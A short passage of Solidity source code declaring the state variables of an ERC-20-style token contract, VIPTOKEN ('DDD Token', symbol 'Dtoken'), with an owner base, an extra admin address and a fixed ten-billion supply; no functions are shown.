...
contract VIPTOKEN is Ownable {
    address public seiAdmin;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "DDD Token";
    string private _cctokensymbol = "Dtoken";
